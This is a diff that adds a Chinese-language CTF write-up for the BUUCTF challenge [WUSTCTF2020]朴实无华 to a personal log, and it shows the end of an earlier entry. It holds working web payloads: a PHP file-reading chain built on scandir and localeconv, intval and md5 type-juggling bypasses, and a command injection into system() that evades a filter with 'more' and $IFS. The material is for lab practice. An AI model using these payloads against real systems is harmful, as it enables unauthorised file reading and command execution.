@@ -21,3 +21,24 @@
                                                                     结论：使用?exp=highlight_file(next(array_reverse(scandir(pos(localeconv()))))); 
                                                                     原因：localeconv返回的第一个元素是 ‘.’ ；scandir函数列举当前目录的文件；由于知道目标文件在当前文件夹的倒数第二个，所以使用next加
                                                                     array_reverse；之后高亮显示
+
+                                                                    
+4        2026/5/8         [WUSTCTF2020]朴实无华        BUUCTF        进入页面没有发现，dirseach扫描。得到robots.txt，访问发现有/fAke_f1agggg.php页面，访问该页面，没有发现，使用burp抓包，得到响应中
+                                                                    有look_at_me: /fl4g.php。访问该页面得到代码。
+                                                                    代码有三关要绕过：
+                                                                       第一关：代码如下，只需传入num=2e4，则intval得到2，intval（num+1）得到20001，成功绕过
+                                                                          if (isset($_GET['num'])){
+                                                                                 $num = $_GET['num'];
+                                                                                    if(intval($num) < 2020 && intval($num + 1) > 2021){
+
+                                                                        第二关：if ($md5==md5($md5))，只需要传入MD5=0e215962017即可，因为它md5加密后也是0e数字的结构
+                                                                        第三关：get_flag参数不可有cat也不可有空格，所以使用nl或者more代替cat，使用${IFS}代替空格即可
+                                                                            $get_flag = $_GET['get_flag'];
+                                                                                if(!strstr($get_flag," ")){
+                                                                                    $get_flag = str_ireplace("cat", "wctf2020", $get_flag);
+                                                                                    system($get_flag);
+                                                                      最终payload：              
+                                                                      /fl4g.php/num=2e4&md5=0e215962017&get_flag=more$IFS$9/var/www/html
+                                                                      /fllllllllllllllllllllllllllllllllllllllllaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+                                                                      aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaag               
+                                                                   
